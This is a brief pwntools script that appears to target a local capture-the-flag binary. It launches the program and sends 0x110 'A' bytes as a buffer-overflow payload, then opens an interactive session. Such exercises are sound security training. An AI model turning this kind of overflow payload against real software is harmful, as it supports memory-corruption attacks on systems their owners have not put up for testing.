from pwn import *

exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

io = process(exe)
payload = b'A'*0x110
io.sendline(payload)
io.interactive()